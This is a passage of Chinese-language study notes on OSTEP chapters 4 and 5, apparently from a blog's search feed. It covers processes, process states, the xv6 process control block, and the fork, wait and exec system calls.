<p>我们可以这样区分机制和策略：机制回答的是一个 how question，比如“如何实现上下文切换？” 而策略回答的是一个 which question，比如“下一个用 CPU 的应该是哪个进程？”</p>
<p>区分好机制和策略，我们在修改策略时就不必关注底层的机制，更利于模块化编程。</p>
</blockquote>
<h2 id="4-1-The-Abstraction-A-Process"><a href="#4-1-The-Abstraction-A-Process" class="headerlink" title="4.1 The Abstraction: A Process"></a>4.1 The Abstraction: A Process</h2><p>OS 为正在运行的程序提供的抽象是进程。进程中包括的内容当然是一个正在运行的程序所拥有的机器状态：</p>
<ul>
<li>Memory：每一个程序都有自己可以读写的内存区域，称为地址空间 (address space)。</li>
<li>Regitsters：进程中应该有各个寄存器的信息，尤其是几个比较重要的寄存器：PC，stack pointer，frame pointer 等。</li>
<li>I/O Information：程序要和可持久化存储设备打交道，因此进程会存储一些 I/O 相关信息，比如当前打开了哪些文件。</li>
</ul>
<h2 id="4-2-Process-API"><a href="#4-2-Process-API" class="headerlink" title="4.2 Process API"></a>4.2 Process API</h2><p>从抽象模型的角度，我们可以提出如下几类进程相关的 API：</p>
<ul>
<li>create：创建一个新的进程。</li>
<li>destroy：虽然一个运行的程序结束时会自动退出，但我们仍然应该有 API 可以强制杀死一个进程。</li>
<li>wait：等待一个进程结束。</li>
<li>Miscellaneous Control：比如暂时挂起一个进程，或让一个进程继续运行。</li>
<li>Status：访问一个进程的信息，比如总运行时长，现在处于什么状态 (running, suspended etc.) 等。</li>
</ul>
<h2 id="4-3-Process-Creation-A-Little-More-Detail"><a href="#4-3-Process-Creation-A-Little-More-Detail" class="headerlink" title="4.3 Process Creation: A Little More Detail"></a>4.3 Process Creation: A Little More Detail</h2><p>创建一个进程 (让一个程序跑起来) 通常要经过以下步骤：</p>
<ul>
<li><p>将程序的代码和静态数据 (比如初始化过的全局变量) 加载到内存中。程序本身是以某种可执行文件的格式存放在硬盘上的 (比如 Linux 中默认使用 ELF)，文件会告诉 OS 应该把哪些代码加载到内存的哪些位置。</p>
<p>  早期的操作系统会 eagerly 地完成加载这个动作。但现代操作系统通常使用延迟加载：当程序真正要用到某一部分的代码/数据时再将数据从交换分区复制进来。</p>
</li>
<li><p>为该程序准备一个 run-time stack。以 C 程序为例，程序通常在栈上存储局部变量，此外传给 main() 的参数也保存在栈上。</p>
</li>
<li><p>OS 准备一些空间用作该程序的堆区。堆区负责为程序中的动态内存申请提供支持，即 malloc()/free()。</p>
</li>
<li><p>做一些和 I/O 相关的准备工作，比如 UNIX 系统中默认为程序打开 stdin, stdout, stderr 三个文件。</p>
</li>
<li><p>让 PC 跳转到该程序的入口地址，开始运行。</p>
</li>
</ul>
<h2 id="4-4-Process-State"><a href="#4-4-Process-State" class="headerlink" title="4.4 Process State"></a>4.4 Process State</h2><p>进程的状态通常包括以下几种：</p>
<ul>
<li>Running：进程正在 CPU 上运行。</li>
<li>Ready：程序可以运行，但当前不在 CPU 上。</li>
<li>Blocked：程序因为做了某种操作使得当前还不能运行 (比如执行 I/O，正在等待数据返回)。</li>
</ul>
<p>下面的图很好地反映了三种状态的切换：</p>
<pre class="mermaid">stateDiagram-v2
Running --> Ready: Descheduled
Ready --> Running: Scheduled
Running --> Blocked: I/O Initiate
Blocked --> Ready: I/O Done</pre>

<p>OS 的调度器有很多事情要决定：比如 process 1 因为 I/O 操作被阻塞时，是否需要将其他进程 process 2切换上来？如果 process 2 运行时 I/O 操作完成，process 1 从 blocked 变成 ready，那么 OS 是将 process 1 立刻请回来还是先做 process 2？……</p>
<h2 id="4-5-Data-Structure"><a href="#4-5-Data-Structure" class="headerlink" title="4.5 Data Structure"></a>4.5 Data Structure</h2><p>OS 中有很多维护信息的数据结构，比如对于进程我们应该有一个 process list，链表中的每个节点存储一个进程的相关信息，通常被称为 process control block (PCB)，再比如我们应该有上下文结构体用于 context switching。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// the registers xv6 will save and restore</span></span><br><span class="line"><span class="comment">// to stop and subsequently restart a process</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> eip;</span><br><span class="line">  <span class="keyword">int</span> esp;</span><br><span class="line">  <span class="keyword">int</span> ebx;</span><br><span class="line">  <span class="keyword">int</span> ecx;</span><br><span class="line">  <span class="keyword">int</span> edx;</span><br><span class="line">  <span class="keyword">int</span> esi;</span><br><span class="line">  <span class="keyword">int</span> edi;</span><br><span class="line">  <span class="keyword">int</span> ebp;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// the different states a process can be in</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">proc_state</span> &#123;</span> UNUSED, EMBRYO, SLEEPING,</span><br><span class="line">RUNNABLE, RUNNING, ZOMBIE &#125;;</span><br><span class="line"><span class="comment">// the information xv6 tracks about each process</span></span><br><span class="line"><span class="comment">// including its register context and state</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *mem;                  <span class="comment">// Start of process memory</span></span><br><span class="line">  uint sz;                    <span class="comment">// Size of process memory</span></span><br><span class="line">  <span class="keyword">char</span> *kstack;               <span class="comment">// Bottom of kernel stack for this process</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">proc_state</span> <span class="title">state</span>;</span>      <span class="comment">// Process state</span></span><br><span class="line">  <span class="keyword">int</span> pid;                    <span class="comment">// Process ID</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">parent</span>;</span>        <span class="comment">// Parent process</span></span><br><span class="line">  <span class="keyword">void</span> *chan;                 <span class="comment">// If non-zero, sleeping on chan</span></span><br><span class="line">  <span class="keyword">int</span> killed;                 <span class="comment">// If non-zero, have been killed</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">ofile</span>[<span class="title">NOFILE</span>];</span> <span class="comment">// Open files</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">cwd</span>;</span>          <span class="comment">// Current directory</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>     <span class="comment">// Switch here to run process</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span>;</span>       <span class="comment">// Trap frame for the current interrupt</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这是 xv6-x86 中的上下文结构体和 PCB。可以看到它存储了比之前提到的更多的一些信息，比如每个进程的内核栈地址，父进程，如果睡眠睡在了哪个地址上，kernel trap 的页面地址等。</p>
<p>进程的状态也比之间提到的 ready, running, blocked 要多。一些很有用的状态包括 zombie，它表示一个程序已经运行结束，但相关的信息还没有被清空。这种状态可以让调用 wait() 的父进程去检查子进程的返回值是否符合要求。</p>
<h2 id="4-6-Summary"><a href="#4-6-Summary" class="headerlink" title="4.6 Summary"></a>4.6 Summary</h2><p>略。</p>
]]></content>
      <categories>
        <category>WISC-CS537 Introduction to Operating Systems</category>
        <category>Book Notes</category>
      </categories>
  </entry>
  <entry>
    <title>OSTEP Chapter 05: Interlude: Process API</title>
    <url>/2022/03/19/OSTEP/OSTEP%20Chapter%2005%20-%20Interlude%20-%20Process%20API/</url>
    <content><![CDATA[<h2 id="5-1-The-fork-System-Call"><a href="#5-1-The-fork-System-Call" class="headerlink" title="5.1 The fork() System Call"></a>5.1 The <code>fork()</code> System Call</h2><p>fork() 系统调用会创建一个和当前进程完全相同的子进程，这两个进程除了 fork() 的返回值不同，其他完全相同。fork() 在父进程中返回子进程的进程号，在子进程中返回 0，这可以用于区分两个进程。</p>
<p><a href="https://github.com/Kristoff-starling/OSTEP/blob/master/bookcode/Chapter%2005%20-%20cpu_api/p1.c">p1.c</a> 展示了一个使用 fork() 的例子，其中 getpid() 函数可以获得当前进程的进程号。注意这个程序的运行结果是 non-deterministic 的：父进程和子进程谁会先输出，这取决于 OS 的调度器。现代操作系统的调度策略极其复杂，可以看<a href="https://linux.cn/article-7325-1.html">这篇文章</a>有一个大概的了解。<span id="more"></span></p>
<h2 id="5-2-The-wait-System-Call"><a href="#5-2-The-wait-System-Call" class="headerlink" title="5.2 The wait() System Call"></a>5.2 The <code>wait()</code> System Call</h2><p><a href="https://github.com/Kristoff-starling/OSTEP/blob/master/bookcode/Chapter%2005%20-%20cpu_api/p2.c">p2.c</a> 展示了一个使用 wait() 的例子，wait() 提供一种同步机制，保证了父进程在子进程结束之后再执行。如果父进程先被调度器选中，那么它执行 wait() 会被阻塞，直到子进程结束；如果子进程先被调度器选中，那么父进程执行 wait() 时看到子进程已经退出则会立刻返回。</p>
<blockquote>
<p><strong>Zombie Process</strong></p>
<p>一个子进程如果已经退出但还没有被它的父进程 wait()，那它就是一个僵尸进程。内核保存了僵尸进程的一份 minimal 的信息，包括进程号、退出状态等，这样以后如果父进程 wait() 了，父进程就可以获取子进程的信息。</p>
<p>被 wait() 过的僵尸进程会被从 process table 中移除。一个 zombie process 如果不被 wait，就会一直待在 process table 中，一旦内核的 process table 满了，就不能再创建新的进程。因此父进程应该及时清理自己的僵尸子进程。如果父进程退出了，那么它的僵尸子进程会被 init 进程 (或其他某个指定的进程) wait 掉。</p>
</blockquote>
<h2 id="5-3-Finally-The-exec-System-Call"><a href="#5-3-Finally-The-exec-System-Call" class="headerlink" title="5.3 Finally, The exec() System Call"></a>5.3 Finally, The <code>exec()</code> System Call</h2><p><a href="https://github.com/Kristoff-starling/OSTEP/blob/master/bookcode/Chapter%2005%20-%20cpu_api/p3.c">p3.c</a> 展示了一个使用 exec() 的例子。exec() 传入一个可执行程序的文件名，它会将该文件的代码和数据加载到内存中覆盖当前的代码和数据，重新初始化堆区和栈，并跳转到新程序的入口开始执行。exec() 不创建新的进程，它只是重启当前的状态机。exec() 如果执行成功就不会返回。</p>
<h2 id="5-4-Why-Motivating-the-API"><a href="#5-4-Why-Motivating-the-API" class="headerlink" title="5.4 Why? Motivating the API"></a>5.4 Why? Motivating the API</h2><p>将 fork() 和 exec() 分开的设计似乎有一些反人类：我们创建一个新进程运行新程序需要两个系统调用。这样设计的真正目的是让我们有机会在 fork() 和 exec() 之间做一些有意思的事情。</p>
<p><a href="https://github.com/Kristoff-starling/OSTEP/blob/master/bookcode/Chapter%2005%20-%20cpu_api/p4.c">p4.c</a> 展示了一个重定向的例子。我们在 fork() 之后 exec() 之前关闭 stdout，再打开一个新的文件，这样新打开的文件的描述符就是 1 (stdout)，这是再 exec()，我们就实现了将标准输出重定向到文件。除了重定向，UNIX 的管道机制也是通过在 fork() 和 exec() 中间操作实现的。</p>
<h2 id="5-5-Process-Control-And-Users"><a href="#5-5-Process-Control-And-Users" class="headerlink" title="5.5 Process Control And Users"></a>5.5 Process Control And Users</h2><p>除了 fork(), wait() 和 exec()，UNIX 系统中还有很多其他控制进程的 API，比如 kill() 用于给进程发送信号。信号机制可以向进程通知外部事件的发生，常见的信号有 SIGINT (interrupt，通常用于结束程序)，SIGTSTP (暂时挂起程序)，SIGSEGV (段错误) 等。</p>
<p>既然信号的能力这么强，那么肯定不能让任意用户随便给别人的进程发送 SIGINT。你需要通过密码登录获取管理员权限，或者你本身是 root 用户，才能执行这些系统资源相关的操作。在用户态，你只能管理你自己的进程。</p>
<h2 id="5-6-Useful-Tools"><a href="#5-6-Useful-Tools" class="headerlink" title="5.6 Useful Tools"></a>5.6 Useful Tools</h2><p>ps 命令可以查看当前活跃的进程。top 命令可以查看所有进程的详细信息。</p>
<h2 id="5-7-Summary"><a href="#5-7-Summary" class="headerlink" title="5.7 Summary"></a>5.7 Summary</h2><p>略。</p>
]]></content>
      <categories>
        <category>WISC-CS537 Introduction to Operating Systems</category>
        <category>Book Notes</category>
      </categories>
  </entry>
</search>
